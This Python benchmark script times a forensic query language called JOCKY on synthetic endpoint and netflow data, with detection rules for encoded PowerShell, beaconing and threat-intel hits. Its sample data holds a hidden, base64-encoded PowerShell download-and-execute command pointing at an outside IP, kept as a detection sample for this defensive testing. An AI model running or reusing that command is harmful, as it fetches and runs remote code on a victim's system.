"""Measure JOCKY at scale so the feasibility slide carries real numbers.

Generates synthetic evidence at several sizes, runs one representative
investigation against each, and records parse time, execute time, throughput
and peak interpreter allocation.

    python deck/bench.py
"""

import csv
import json
import os
import random
import sys
import tempfile
import time
import tracemalloc

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from jocky.runtime import compile_source, run_source   # noqa: E402

SCALES = [1_000, 5_000, 25_000, 100_000]

IMAGES = [
    "C:/Windows/System32/cmd.exe",
    "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",
    "C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE",
    "C:/Windows/System32/svchost.exe",
    "C:/Windows/System32/wevtutil.exe",
    "C:/Users/a.mehta/AppData/Local/Temp/svchost_update.exe",
    "C:/Windows/explorer.exe",
]
PARENTS = [
    "C:/Windows/explorer.exe",
    "C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE",
    "C:/Windows/System32/services.exe",
]
BENIGN_CMDS = [
    '"C:/Windows/System32/cmd.exe" /c dir',
    '"C:/Windows/explorer.exe"',
    '"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE" /n Q3.docm',
]
SUSPECT_CMDS = [
    '"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" -nop -w hidden -enc '
    'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A'
    'RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAzADQA'
    'LgA3ADIALgAxADkALwBhACcAKQA=',
]
PUBLIC = ["185.234.72.19", "45.133.1.87", "91.219.236.14", "103.75.190.22"]
PRIVATE = ["10.14.7.23", "10.14.2.9", "10.14.0.1", "172.16.4.11"]

SCRIPT = '''
case "BENCH"
source events = ingest "events.json"
source flows  = ingest "netflow.csv"

let suspect = events
    |> where (entropy(command_line) > 4.0)
    |> where (image contains "powershell")
    |> select (timestamp, host, image)

let beacon = flows
    |> where (direction == "outbound")
    |> where (is_public_ip(dst_ip))
    |> where (bytes < 2000)
    |> group by (dst_ip, dst_port)
    |> sort by (count desc)

match flows.dst_ip against "intel_ips.txt" as intel_flows
timeline events on timestamp as "bench"
report "BENCH"
finding "encoded powershell" severity high from suspect
finding "beaconing" severity critical from beacon
finding "intel hit" severity critical from intel_flows
emit suspect as "Suspect"
emit beacon  as "Beacons"
emit intel_flows as "Intel"
'''


def make_events(n, rng):
    out = []
    for i in range(n):
        suspect = rng.random() < 0.04
        out.append({
            "timestamp": f"2026-09-21T{(9 + i // 3600) % 24:02d}:{(i // 60) % 60:02d}:{i % 60:02d}Z",
            "host": "FIN-WS-014" if rng.random() < 0.6 else f"FIN-WS-{rng.randint(1, 40):03d}",
            "event_id": rng.choice([1, 3, 11, 4688, 4104]),
            "user": rng.choice(["CORP\a.mehta", "CORP\svc_backup", "NT AUTHORITY\SYSTEM"]),
            "image": rng.choice(IMAGES),
            "parent_image": rng.choice(PARENTS),
            "command_line": rng.choice(SUSPECT_CMDS if suspect else BENIGN_CMDS),
            "integrity": rng.choice(["low", "medium", "high", "system"]),
            "signed": not suspect,
            "hash": "%064x" % rng.getrandbits(256),
        })
    return out


def make_flows(n, rng):
    rows = []
    for i in range(n):
        ext = rng.random() < 0.12
        rows.append({
            "timestamp": f"2026-09-21T{(9 + i // 3600) % 24:02d}:{(i // 60) % 60:02d}:{i % 60:02d}Z",
            "src_ip": rng.choice(PRIVATE),
            "dst_ip": rng.choice(PUBLIC) if ext else rng.choice(PRIVATE),
            "src_port": rng.randint(49152, 65535),
            "dst_port": rng.choice([443, 80, 445, 53]),
            "proto": "tcp",
            "bytes": rng.randint(200, 900) if ext else rng.randint(2000, 400000),
            "packets": rng.randint(3, 400),
            "direction": "outbound" if ext else rng.choice(["outbound", "inbound"]),
        })
    return rows


def run_scale(n, rng):
    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "events.json"), "w", encoding="utf-8") as fh:
            json.dump(make_events(n, rng), fh)
        flows = make_flows(n // 2, rng)
        if flows:
            with open(os.path.join(d, "netflow.csv"), "w", newline="", encoding="utf-8") as fh:
                w = csv.DictWriter(fh, fieldnames=list(flows[0]))
                w.writeheader()
                w.writerows(flows)
        with open(os.path.join(d, "intel_ips.txt"), "w", encoding="utf-8") as fh:
            fh.write("\n".join(PUBLIC) + "\n")

        cwd = os.getcwd()
        os.chdir(d)
        try:
            t0 = time.perf_counter()
            compile_source(SCRIPT, "bench.jky")
            parse_ms = (time.perf_counter() - t0) * 1000

            tracemalloc.start()
            t0 = time.perf_counter()
            art, _ = run_source(SCRIPT, filename="bench.jky", collect_tokens=True)
            exec_ms = (time.perf_counter() - t0) * 1000
            _cur, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()
        finally:
            os.chdir(cwd)

    return {
        "events": n,
        "flows": n // 2,
        "total_records": n + n // 2,
        "parse_ms": round(parse_ms, 1),
        "exec_ms": round(exec_ms, 1),
        "records_per_sec": int((n + n // 2) / (exec_ms / 1000)),
        "peak_kb": round(peak / 1024, 1),
        "findings": len(art["findings"]),
        "tables": len(art["tables"]),
        "errors": art["errors"],
    }


if __name__ == "__main__":
    rng = random.Random(20260921)          # reproducible
    results = []
    for n in SCALES:
        r = run_scale(n, rng)
        results.append(r)
        print(f"{n:>7,} events  parse {r['parse_ms']:>7.1f} ms  "
              f"exec {r['exec_ms']:>8.1f} ms  "
              f"{r['records_per_sec']:>10,} rec/s  peak {r['peak_kb']:>8.1f} KB  "
              f"findings={r['findings']}")
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bench_results.json")
    with open(out, "w", encoding="utf-8") as fh:
        json.dump({"scale": results}, fh, indent=2)
    print("\nwrote", out)
